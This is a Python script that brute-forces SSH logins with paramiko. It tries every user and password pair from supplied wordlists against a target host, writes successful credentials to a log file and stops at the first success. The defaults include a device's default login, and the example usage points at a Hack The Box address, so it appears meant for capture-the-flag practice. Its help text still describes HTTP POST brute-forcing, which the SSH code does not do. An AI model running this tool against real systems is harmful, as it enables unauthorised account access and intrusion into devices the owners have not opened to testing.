#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from __future__ import annotations

import argparse
import logging
import sys
import time
from pathlib import Path
from typing import List, NoReturn

import paramiko

from logger import get_logger


def login_ssh(host='192.168.1.20', user='ubnt', pwd='ubnt', debug: bool = False, port=22) -> bool:
    """
    :param str host: IP del servidor
    :param str user:  Usuario del servidor
    :param str pwd:    Contrasena del usuario cel servidor
    :param str debug:        Establecer modo depuracion para que imprima errores y cree un log
    :param int port:   Puerto en el que escucha el servidor ssh
    """

    # compruebo que el servidor esta online y en caso afirmativo me conecto

    sys.path.append('./')
    if debug:
        paramiko.util.log_to_file('paramiko.log')

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(host, port, user, pwd, allow_agent=False, look_for_keys=False, auth_timeout=2)
    except paramiko.AuthenticationException:
        return False
    finally:
        client.close()
    return True


def request_ssh(args: argparse, username: str, password: str, total_size: int, cont)-> NoReturn:
    start = time.time()
    response: bool = login_ssh(args.target, username, password, debug=False)
    end = time.time()

    # response: requests.models.Response = make_request(args.target, form=my_json)
    # if response.status_code == HTTPStatus.OK:
    #    valid: bool = check_regex_response(response.text, args.regex)
    if response:
        logger.warning(
            f'Trying {cont}/{total_size}: user: "{username}", pass: "{password}" -> Success ({end - start} seg)')
        p: Path = Path('bruteforce_ssh.log')
        with open(str(p), 'a') as f:
            f.write(f'Trying: user: "{username}", pass: "{password}" -> Success\n')
        sys.exit(0)
    else:
        logger.debug(f'Trying {cont}/{total_size}: user: "{username}", pass: "{password}" -> Fail ({end - start} seg)')
    # else:
    #    logger.error(response)
    #    logger.error(response.text)


def main(args: argparse)-> NoReturn:
    """
    Metodo que realizada una peticion asincrona post por cada elemento de los diccionarios proporcionados
    :param args:
    :return:
    """
    name_username: str
    name_password: str
    # my_json: Dict[str, str] = json.loads(args.json)
    # keys_json = list(my_json)

    '''if args.Login is None:
        name_username = args.login
    else:
        name_username = args.Login

    if args.Password is None:
        name_password = args.password
    else:
        name_password = args.Password'''

    dict_users: List = list()
    dict_passwords: List = list()

    # creamos un diccionaro de users
    if args.Login is None:
        dict_users.append(args.login)
    else:
        file_username: Path = Path(args.Login)
        if file_username.exists():
            dict_users = file_username.read_text().split('\n')
            dict_users.remove('')  # eliminar lineas en blanco
        else:
            logger.critical(f'File "{args.Login}" not exits')
            sys.exit(1)

    # creamos un diccionaro de passwords
    if args.Password is None:
        dict_passwords.append(args.password)
    else:
        file_password: Path = Path(args.Password)
        if file_password.exists():
            dict_passwords = file_password.read_text().split('\n')
        else:
            logger.critical(f'File "{args.Password}" not exits')
            sys.exit(1)

    len_user = len(dict_users)
    len_pwd = len(dict_passwords)

    user: str
    pwd: str
    cont: int = 1

    for user in dict_users:
        # Actualizamos el username si es necesario ponerlo, ya se hace al crear la lista
        # if name_username in my_json.keys():
        #    my_json[name_username] = user

        for pwd in dict_passwords:
            # Actualizamos la contraseÃ±a
            # if name_password in my_json.keys():
            #    my_json[name_password] = pwd

            request_ssh(args, user, pwd, len_user * len_pwd, cont)
            cont += 1


def create_arg_parser() -> argparse:
    """
    Metodo para establecer los argumentos que necesita la clase
    :return:
    """

    example = """python3 %(prog)s  http://docker.hackthebox.eu:31658/ 'Invalid password!' -l admin -P password.txt -j '{"password":""}' -v"""
    my_parser = argparse.ArgumentParser(
        description='%(prog)s is a script to perform brute force attacks by begging HTTP POST requests.',
        usage=f'{example}')

    requiered = my_parser.add_argument_group('requiered arguments')
    requiered.add_argument('target', help='Target to send requests.')

    my_parser.add_argument('-l', '--login', help='Name of a user.', default='root')
    my_parser.add_argument('-L', '--Login', help='Path of a file with users.')
    my_parser.add_argument('-p', '--password', help='A passwords.', default='admin')
    my_parser.add_argument('-P', '--Password', help='Path of a file with passwords.')
    my_parser.add_argument('-v', '--verbose', action='store_true', help='Verbose flag (boolean).', default=False)

    if len(sys.argv) == 1:
        my_parser.print_help()
        sys.exit(1)
    return my_parser.parse_args()


if __name__ == '__main__':
    arg: argparse = create_arg_parser()

    global logger
    logger = get_logger(arg.verbose, 'bruteforce')

    if arg.verbose:
        logger.setLevel(logging.DEBUG)
    else:
        logger.setLevel(logging.INFO)

    main(arg)

# if __name__ == '__main__':
#    salida = conexionSSH('192.168.1.49', 'usuario', 'usuario', debug=False)
#    print(salida)
